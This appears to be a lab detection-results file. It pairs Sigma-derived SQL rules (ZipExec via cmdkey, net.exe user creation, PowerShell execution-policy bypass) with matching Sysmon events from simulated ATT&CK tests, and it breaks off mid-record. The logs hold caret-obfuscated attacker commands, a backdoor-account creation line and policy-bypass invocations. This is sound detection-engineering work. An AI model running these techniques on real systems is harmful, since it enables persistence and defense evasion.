{
  "title": "Suspicious ZipExec Execution",
  "id": "90dcf730-1b71-4ae7-9ffc-6fcf62bd0132",
  "description": "ZipExec is a Proof-of-Concept (POC) tool to wrap binary-based tools into a password-protected zip file.",
  "sigmafile": "",
  "sigma": [
    "SELECT * FROM logs WHERE Channel='Microsoft-Windows-Sysmon/Operational' AND (EventID=1 AND ((CommandLine LIKE '%/generic:Microsoft\\_Windows\\_Shell\\_ZipFolder:filename=%' ESCAPE '\\' AND CommandLine LIKE '%.zip%' ESCAPE '\\' AND CommandLine LIKE '%/pass:%' ESCAPE '\\' AND CommandLine LIKE '%/user:%' ESCAPE '\\') OR (CommandLine LIKE '%/delete%' ESCAPE '\\' AND CommandLine LIKE '%Microsoft\\_Windows\\_Shell\\_ZipFolder:filename=%' ESCAPE '\\' AND CommandLine LIKE '%.zip%' ESCAPE '\\')))"
  ],
  "rule_level": "medium",
  "tags": [
    "attack.execution",
    "attack.defense-evasion",
    "attack.t1218",
    "attack.t1202"
  ],
  "count": 1,
  "matches": [
    {
      "row_id": 235,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "cmdkey.exe  /delete:Microsoft_Windows_Shell_ZipFolder:filename=payload.zip",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "Credential Manager Command Line Utility",
      "EventID": 1,
      "EventRecordID": 208859,
      "FileVersion": "10.0.26100.7019 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=BE45BBC5E0ACF6D8D9D412C688A75CFE,SHA256=4125CD7966810CDFAFB18157C276A88E6AC443C7C98D42593C70247045815028,IMPHASH=03AD7A1AF78BF7A500FB199CABE4C34A",
      "IMPHASH": "03AD7A1AF78BF7A500FB199CABE4C34A",
      "Image": "C:\\Windows\\System32\\cmdkey.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "BE45BBC5E0ACF6D8D9D412C688A75CFE",
      "Opcode": 0,
      "OriginalFileName": "cmdkey.exe",
      "OriginalLogfile": "t1114__t1114_013.evtx",
      "ParentCommandLine": "cmd.exe /c \"cmdkey.exe /del^ete:Microsoft_Windows_Shell_ZipFolder:filename=payload.z^ip\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-E4B5-6A2E-4010-000000002C00",
      "ParentProcessId": 2732,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-E4B5-6A2E-4110-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "4125CD7966810CDFAFB18157C276A88E6AC443C7C98D42593C70247045815028",
      "SystemTime": "2026-06-14T17:28:21.189518Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 17:28:21.183",
      "Version": 5
    }
  ]
},
{
  "title": "New User Created Via Net.EXE",
  "id": "cd219ff3-fa99-45d4-8380-a7d15116c6dc",
  "description": "Identifies the creation of local users via the net.exe command.",
  "sigmafile": "",
  "sigma": [
    "SELECT * FROM logs WHERE Channel='Microsoft-Windows-Sysmon/Operational' AND (EventID=1 AND (((Image LIKE '%\\\\net.exe' ESCAPE '\\' OR Image LIKE '%\\\\net1.exe' ESCAPE '\\') OR (OriginalFileName='net.exe' OR OriginalFileName='net1.exe')) AND (CommandLine LIKE '%user%' ESCAPE '\\' AND CommandLine LIKE '%add%' ESCAPE '\\')))"
  ],
  "rule_level": "medium",
  "tags": [
    "attack.persistence",
    "attack.t1136.001"
  ],
  "count": 6,
  "matches": [
    {
      "row_id": 38,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "net  user testuser Password /add",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "Net Command",
      "EventID": 1,
      "EventRecordID": 213218,
      "FileVersion": "10.0.26100.7019 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=8A1E71312BD2AAE202652113049CDBD1,SHA256=BB3E638C8B5B6EF80847E364AEEF2796CAD25D3539CF9B41D3820FA48943E777,IMPHASH=EF46B86C2346DA0A991DE4B78AAF4E75",
      "IMPHASH": "EF46B86C2346DA0A991DE4B78AAF4E75",
      "Image": "C:\\Windows\\System32\\net.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "8A1E71312BD2AAE202652113049CDBD1",
      "Opcode": 0,
      "OriginalFileName": "net.exe",
      "OriginalLogfile": "t1018__t1018_006.evtx",
      "ParentCommandLine": "cmd.exe /c \"n^e^t u^s^e^r t^e^s^t^u^s^e^r P^a^s^s^w^o^r^d /a^d^d\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-EF32-6A2E-C218-000000002C00",
      "ParentProcessId": 10072,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-EF32-6A2E-C318-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "BB3E638C8B5B6EF80847E364AEEF2796CAD25D3539CF9B41D3820FA48943E777",
      "SystemTime": "2026-06-14T18:13:06.416053Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 18:13:06.411",
      "Version": 5
    },
    {
      "row_id": 39,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "C:\\WINDOWS\\system32\\net1  user testuser Password /add",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "Net Command",
      "EventID": 1,
      "EventRecordID": 213219,
      "FileVersion": "10.0.26100.7019 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=158DB954503C803C0840DD424FB608F8,SHA256=8489DB35375D890314EB8F7CD9E0CBD3866475F4E252865F00F649B0A02FD757,IMPHASH=98A56655C7E54BCE7F55B3F01AB5B07E",
      "IMPHASH": "98A56655C7E54BCE7F55B3F01AB5B07E",
      "Image": "C:\\Windows\\System32\\net1.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "158DB954503C803C0840DD424FB608F8",
      "Opcode": 0,
      "OriginalFileName": "net1.exe",
      "OriginalLogfile": "t1018__t1018_006.evtx",
      "ParentCommandLine": "net  user testuser Password /add",
      "ParentImage": "C:\\Windows\\System32\\net.exe",
      "ParentProcessGuid": "20525DD1-EF32-6A2E-C318-000000002C00",
      "ParentProcessId": 11060,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-EF32-6A2E-C418-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "8489DB35375D890314EB8F7CD9E0CBD3866475F4E252865F00F649B0A02FD757",
      "SystemTime": "2026-06-14T18:13:06.466992Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 18:13:06.454",
      "Version": 5
    },
    {
      "row_id": 52,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "net  user testuser Password /add",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "Net Command",
      "EventID": 1,
      "EventRecordID": 213649,
      "FileVersion": "10.0.26100.7019 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=8A1E71312BD2AAE202652113049CDBD1,SHA256=BB3E638C8B5B6EF80847E364AEEF2796CAD25D3539CF9B41D3820FA48943E777,IMPHASH=EF46B86C2346DA0A991DE4B78AAF4E75",
      "IMPHASH": "EF46B86C2346DA0A991DE4B78AAF4E75",
      "Image": "C:\\Windows\\System32\\net.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "8A1E71312BD2AAE202652113049CDBD1",
      "Opcode": 0,
      "OriginalFileName": "net.exe",
      "OriginalLogfile": "t1018__t1018_036.evtx",
      "ParentCommandLine": "cmd.exe /c \"n^e^t u^s^e^r t^e^s^t^u^s^e^r P^a^s^s^w^o^r^d /a^d^d\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-F060-6A2E-9919-000000002C00",
      "ParentProcessId": 10944,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-F060-6A2E-9A19-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "BB3E638C8B5B6EF80847E364AEEF2796CAD25D3539CF9B41D3820FA48943E777",
      "SystemTime": "2026-06-14T18:18:08.407776Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 18:18:08.404",
      "Version": 5
    },
    {
      "row_id": 53,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "C:\\WINDOWS\\system32\\net1  user testuser Password /add",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "Net Command",
      "EventID": 1,
      "EventRecordID": 213650,
      "FileVersion": "10.0.26100.7019 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=158DB954503C803C0840DD424FB608F8,SHA256=8489DB35375D890314EB8F7CD9E0CBD3866475F4E252865F00F649B0A02FD757,IMPHASH=98A56655C7E54BCE7F55B3F01AB5B07E",
      "IMPHASH": "98A56655C7E54BCE7F55B3F01AB5B07E",
      "Image": "C:\\Windows\\System32\\net1.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "158DB954503C803C0840DD424FB608F8",
      "Opcode": 0,
      "OriginalFileName": "net1.exe",
      "OriginalLogfile": "t1018__t1018_036.evtx",
      "ParentCommandLine": "net  user testuser Password /add",
      "ParentImage": "C:\\Windows\\System32\\net.exe",
      "ParentProcessGuid": "20525DD1-F060-6A2E-9A19-000000002C00",
      "ParentProcessId": 1120,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-F060-6A2E-9B19-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "8489DB35375D890314EB8F7CD9E0CBD3866475F4E252865F00F649B0A02FD757",
      "SystemTime": "2026-06-14T18:18:08.424569Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 18:18:08.421",
      "Version": 5
    },
    {
      "row_id": 65,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "net  user testuser Password /add",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "Net Command",
      "EventID": 1,
      "EventRecordID": 214264,
      "FileVersion": "10.0.26100.7019 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=8A1E71312BD2AAE202652113049CDBD1,SHA256=BB3E638C8B5B6EF80847E364AEEF2796CAD25D3539CF9B41D3820FA48943E777,IMPHASH=EF46B86C2346DA0A991DE4B78AAF4E75",
      "IMPHASH": "EF46B86C2346DA0A991DE4B78AAF4E75",
      "Image": "C:\\Windows\\System32\\net.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "8A1E71312BD2AAE202652113049CDBD1",
      "Opcode": 0,
      "OriginalFileName": "net.exe",
      "OriginalLogfile": "t1018__t1018_082.evtx",
      "ParentCommandLine": "cmd.exe /c \"n^e^t u^s^e^r t^e^s^t^u^s^e^r P^a^s^s^w^o^r^d /a^d^d\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-F227-6A2E-C51A-000000002C00",
      "ParentProcessId": 5564,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-F227-6A2E-C61A-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "BB3E638C8B5B6EF80847E364AEEF2796CAD25D3539CF9B41D3820FA48943E777",
      "SystemTime": "2026-06-14T18:25:43.517869Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 18:25:43.512",
      "Version": 5
    },
    {
      "row_id": 66,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "C:\\WINDOWS\\system32\\net1  user testuser Password /add",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "Net Command",
      "EventID": 1,
      "EventRecordID": 214265,
      "FileVersion": "10.0.26100.7019 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=158DB954503C803C0840DD424FB608F8,SHA256=8489DB35375D890314EB8F7CD9E0CBD3866475F4E252865F00F649B0A02FD757,IMPHASH=98A56655C7E54BCE7F55B3F01AB5B07E",
      "IMPHASH": "98A56655C7E54BCE7F55B3F01AB5B07E",
      "Image": "C:\\Windows\\System32\\net1.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "158DB954503C803C0840DD424FB608F8",
      "Opcode": 0,
      "OriginalFileName": "net1.exe",
      "OriginalLogfile": "t1018__t1018_082.evtx",
      "ParentCommandLine": "net  user testuser Password /add",
      "ParentImage": "C:\\Windows\\System32\\net.exe",
      "ParentProcessGuid": "20525DD1-F227-6A2E-C61A-000000002C00",
      "ParentProcessId": 11240,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-F227-6A2E-C71A-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "8489DB35375D890314EB8F7CD9E0CBD3866475F4E252865F00F649B0A02FD757",
      "SystemTime": "2026-06-14T18:25:43.532733Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 18:25:43.529",
      "Version": 5
    }
  ]
},
{
  "title": "Change PowerShell Policies to an Insecure Level",
  "id": "87e3c4e8-a6a8-4ad9-bb4f-46e7ff99a180",
  "description": "Detects changing the PowerShell script execution policy to a potentially insecure level using the \"-ExecutionPolicy\" flag.",
  "sigmafile": "",
  "sigma": [
    "SELECT * FROM logs WHERE Channel='Microsoft-Windows-Sysmon/Operational' AND (EventID=1 AND (((OriginalFileName='PowerShell.EXE' OR OriginalFileName='pwsh.dll') OR (Image LIKE '%\\\\powershell.exe' ESCAPE '\\' OR Image LIKE '%\\\\pwsh.exe' ESCAPE '\\')) AND (CommandLine LIKE '%-executionpolicy %' ESCAPE '\\' OR CommandLine LIKE '% -ep %' ESCAPE '\\' OR CommandLine LIKE '% -exec %' ESCAPE '\\') AND (CommandLine LIKE '%Bypass%' ESCAPE '\\' OR CommandLine LIKE '%Unrestricted%' ESCAPE '\\')))"
  ],
  "rule_level": "medium",
  "tags": [
    "attack.execution",
    "attack.t1059.001"
  ],
  "count": 6,
  "matches": [
    {
      "row_id": 146,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "powershell.exe  -\\\"nop\\\" -noni -w 1 -exEC bypass -Command \\\"Write-Host 'Test'\\\"",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "Windows PowerShell",
      "EventID": 1,
      "EventRecordID": 204264,
      "FileVersion": "10.0.26100.5074 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=A97E6573B97B44C96122BFA543A82EA1,SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77",
      "IMPHASH": "AFACF6DC9041114B198160AAB4D0AE77",
      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "A97E6573B97B44C96122BFA543A82EA1",
      "Opcode": 0,
      "OriginalFileName": "PowerShell.EXE",
      "OriginalLogfile": "t1059.001__t1059.001_061.evtx",
      "ParentCommandLine": "cmd.exe /c \"powershell.exe -\\\"nop\\\" -noni -w 1 -exEC bypass -Command \\\"Write-Host 'Test'\\\"\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-D64A-6A2E-4107-000000002C00",
      "ParentProcessId": 8876,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-D64A-6A2E-4207-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46",
      "SystemTime": "2026-06-14T16:26:50.611359Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 16:26:50.584",
      "Version": 5
    },
    {
      "row_id": 165,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "powershell.exe  /\"nop\" -ep bypass -\"c\" \"Write-Host 'Bypass'\"",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "Windows PowerShell",
      "EventID": 1,
      "EventRecordID": 206914,
      "FileVersion": "10.0.26100.5074 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=A97E6573B97B44C96122BFA543A82EA1,SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77",
      "IMPHASH": "AFACF6DC9041114B198160AAB4D0AE77",
      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "A97E6573B97B44C96122BFA543A82EA1",
      "Opcode": 0,
      "OriginalFileName": "PowerShell.EXE",
      "OriginalLogfile": "t1059.001__t1059.001_449.evtx",
      "ParentCommandLine": "C:\\Windows\\System32\\cmd.exe /c p^o^w^e^r^s^h^e^l^l.exe /\"nop\" -ep bypass -\"c\" \"Write-Host 'Bypass'\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-DF9E-6A2E-700C-000000002C00",
      "ParentProcessId": 11632,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-DF9E-6A2E-710C-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46",
      "SystemTime": "2026-06-14T17:06:38.125174Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 17:06:38.119",
      "Version": 5
    },
    {
      "row_id": 169,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "powershell.exe  -\"nop\" -Ep bypass -C \"Start-Process calc.exe\"",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "Windows PowerShell",
      "EventID": 1,
      "EventRecordID": 207003,
      "FileVersion": "10.0.26100.5074 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=A97E6573B97B44C96122BFA543A82EA1,SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77",
      "IMPHASH": "AFACF6DC9041114B198160AAB4D0AE77",
      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "A97E6573B97B44C96122BFA543A82EA1",
      "Opcode": 0,
      "OriginalFileName": "PowerShell.EXE",
      "OriginalLogfile": "t1059.001__t1059.001_451.evtx",
      "ParentCommandLine": "C:\\Windows\\System32\\cmd.exe /c powershell.exe -\"nop\" -Ep bypass -C \"Start-Process calc.exe\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-DFD0-6A2E-9C0C-000000002C00",
      "ParentProcessId": 11064,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-DFD0-6A2E-9F0C-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46",
      "SystemTime": "2026-06-14T17:07:28.513603Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 17:07:28.507",
      "Version": 5
    },
    {
      "row_id": 172,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "powershell.exe  /\"nop\" -ep bypass -c \"Start-Process calc.exe\"",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "Windows PowerShell",
      "EventID": 1,
      "EventRecordID": 207063,
      "FileVersion": "10.0.26100.5074 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=A97E6573B97B44C96122BFA543A82EA1,SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77",
      "IMPHASH": "AFACF6DC9041114B198160AAB4D0AE77",
      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "A97E6573B97B44C96122BFA543A82EA1",
      "Opcode": 0,
      "OriginalFileName": "PowerShell.EXE",
      "OriginalLogfile": "t1059.001__t1059.001_452.evtx",
      "ParentCommandLine": "C:\\Windows\\System32\\cmd.exe /C powershell.exe /\"nop\" -ep bypass -c \"Start-Process calc.exe\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-DFED-6A2E-BE0C-000000002C00",
      "ParentProcessId": 11136,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-DFED-6A2E-BF0C-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46",
      "SystemTime": "2026-06-14T17:07:57.731859Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 17:07:57.727",
      "Version": 5
    },
    {
      "row_id": 178,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "powershell.exe  -nop -ep bypass /\"c\" \"Start-Process calc.exe\"",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "Windows PowerShell",
      "EventID": 1,
      "EventRecordID": 207157,
      "FileVersion": "10.0.26100.5074 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=A97E6573B97B44C96122BFA543A82EA1,SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77",
      "IMPHASH": "AFACF6DC9041114B198160AAB4D0AE77",
      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "A97E6573B97B44C96122BFA543A82EA1",
      "Opcode": 0,
      "OriginalFileName": "PowerShell.EXE",
      "OriginalLogfile": "t1059.001__t1059.001_454.evtx",
      "ParentCommandLine": "C:\\Windows\\System32\\cmd.exe /C powershell.exe -nop -ep bypass /\"c\" \"Start-Process calc.exe\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-E01E-6A2E-ED0C-000000002C00",
      "ParentProcessId": 7156,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-E01E-6A2E-EE0C-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46",
      "SystemTime": "2026-06-14T17:08:46.602155Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 17:08:46.599",
      "Version": 5
    },
    {
      "row_id": 187,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "powershell.exe  -\"nop\" -EP bypass -C \"Start-Process calc.exe\"",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "Windows PowerShell",
      "EventID": 1,
      "EventRecordID": 207302,
      "FileVersion": "10.0.26100.5074 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=A97E6573B97B44C96122BFA543A82EA1,SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77",
      "IMPHASH": "AFACF6DC9041114B198160AAB4D0AE77",
      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "A97E6573B97B44C96122BFA543A82EA1",
      "Opcode": 0,
      "OriginalFileName": "PowerShell.EXE",
      "OriginalLogfile": "t1059.001__t1059.001_457.evtx",
      "ParentCommandLine": "C:\\Windows\\System32\\cmd.exe /C powershell.exe -\"nop\" -EP bypass -C \"Start-Process calc.exe\"",
